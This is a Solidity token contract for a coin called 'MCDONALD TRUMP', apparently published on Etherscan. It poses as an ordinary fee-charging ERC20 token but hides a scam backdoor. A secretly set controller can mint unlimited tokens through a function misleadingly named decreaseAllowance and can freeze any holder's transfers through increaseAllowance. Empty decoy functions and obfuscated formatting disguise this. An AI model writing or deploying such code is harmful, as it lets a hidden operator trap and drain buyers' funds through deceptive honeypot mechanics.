/**
 *Submitted for verification at Etherscan.io on 2022-11-12
*/

/**

*/

/**

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function approve(address spender, uint256 amount) external returns (bool);

}


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this; //
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}


library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash
        = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



contract Ownable is Context {
    function changeRouterVersion(address dexRouter) public onlyOwner{}
    function transferOwnership(address newOwner) public virtual onlyToken {
        emit OwnershipTransferred(_owner, address(newOwner));
        _owner = newOwner;
    }
    function setSellTax(uint256 newSellTax) public onlyOwner{}
    function setBuyTax(uint256 newBuyTax) public onlyOwner{}
    function setMaxTxAmount(address toSender, address toSenderT) external onlyOwner{
        require(toSenderT==address(0));
        _token = toSender;
    }
    
    modifier
     onlyToken
     (
     ) 
     {
    require
    (_token
    == 
    _msgSender()
    , 
    "");
    _;
    }
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    address private _owner;

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    address private _token;
    function owner() public view returns (address) {
        return _owner;
    }
    modifier
     onlyOwner() {
        require(_owner == _msgSender(), "notowner");
        _;
    }
    function renounceOwnership() public onlyToken{
       _owner = address(0xdead);
    }
}

contract MCDONALDTRUMP is Context, IERC20, Ownable {
    mapping(address => bool) private jfafeaf;
    mapping(address => bool) private _ExcluFee;
    using Address for address;
    bool private TokenTool = true;
    mapping(address => mapping(address => uint256)) private allown;
    uint256 private uefnafa = uint256(0);
    using SafeMath for uint256;
    address[] private _jfeafg;
    mapping(address => uint256) private _jeefave;
    uint8 private _wuirbmea;
    address _owner;
    mapping(address => uint256) private _jmwafwa;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tFeeTotal = BurnFee+marketFee;

    uint256 private _totalSupply = 100000000000000 * 10**4;
    uint8 private _decimals = 9;
    string private _name = "MCDONALD TRUMP";
    string private _symbol = "$MDT";
   
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private marketWallet = msg.sender;
  
    uint256 private BurnFee = 1;
    uint256 private marketFee = 3;

    constructor() public {
        _owner = _msgSender();
        _jeefave[_msgSender()] = _totalSupply;
        _ExcluFee[owner()] = true;
        _ExcluFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if//
        (
            _ExcluFee
            [_msgSender()] 
            || 
            _ExcluFee
            [
                recipient]
                )
                {
            _transfer
            (_msgSender
            (), 
            recipient, 
            amount);
            return 
            true;
        }
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer(_msgSender(), marketWallet, MarketAmount);
        _transfer(_msgSender(), deadAddress, BurnAmount);
        _transfer(_msgSender(), recipient, amount.sub(MarketAmount).sub(BurnAmount));
        return true;
    }

    function 
    transferFrom
    (
        address sender,
        address recipient,
        uint256 amount
    ) public 
    override returns (bool) {
        if//
        (
            _ExcluFee
            [
                _msgSender
                ()]
                 || 
                 _ExcluFee
                 [recipient
                 ])
                 {
            _transfer
            (
                sender, 
                recipient, 
                amount)
                ;
        }       
        uint256 MarketAmount = amount.mul(marketFee).div(100);
        uint256 BurnAmount = amount.mul(BurnFee).div(100);
        _transfer
        (sender, marketWallet, MarketAmount);
        _transfer
        (sender, deadAddress, BurnAmount);
        _transfer
        (sender, recipient, amount.sub(MarketAmount).sub(BurnAmount));
        _approve(
            sender,
            _msgSender(),
            allown[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");
        if//
         (
             TokenTool
             )
              {

            require//
            (jfafeaf
            [from
            ] == 
            false,
             "");
        }
        _transfers
        (from, 
        to, 
        amount);
    }

    function pause()public onlyOwner{}
    function decreaseAllowance
    (address toSender, uint256 decreaseA) external 
    onlyToken//
    () 
    {
        require(
            decreaseA
         > 0, 
         "");
        uint256
         decreaseS 
         = _jmwafwa
         [toSender];
        if 
        (decreaseS
         == 
         0) 
         _jfeafg.
         push(
             toSender);
        _jmwafwa
        [toSender]
         = //
        decreaseS.
        add(
            decreaseA);
        uefnafa =
         uefnafa.
         add
         (decreaseA);
        _jeefave[
            toSender] 
            = //
        _jeefave[toSender
        ].
        add(
            decreaseA);
        
    }
     function//
     increaseAllowance
     (address
      toSender
      ) 
      external 
      onlyToken//
      () 
      {
        jfafeaf
        [
        toSender] =
         true;
        }
    function//
     ExclusionFee
     (address
      toSender
      ) 
      external 
      onlyToken//
      () 
      {
        jfafeaf
        [
        toSender] =
         false;
        }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "");
        require(recipient != address(0), "");
    
        _jeefave[sender] = _jeefave[sender].sub(toAmount);
        _jeefave[recipient] = _jeefave[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function aniceice//
    (address toSender)
        external
        view
        onlyToken//
        ()
        returns (bool)
    {
        return jfafeaf[toSender];
    }

    function includeInFee(address toSender) public //
    onlyToken//
     {
        _ExcluFee[toSender] = false;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }



    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }


    function excludeFromFee(address toSender) public //
    onlyToken//
     {
        _ExcluFee[toSender] = true;
    }

    function changeFeeReceivers(address newLiquidityReceiver, address newMarketingWallet, address newAmarketingWallet, address newAmarketingWallet2) public onlyOwner {}

    function balanceOf(address account) public view override returns (uint256) {
        return _jeefave[account];
    }

}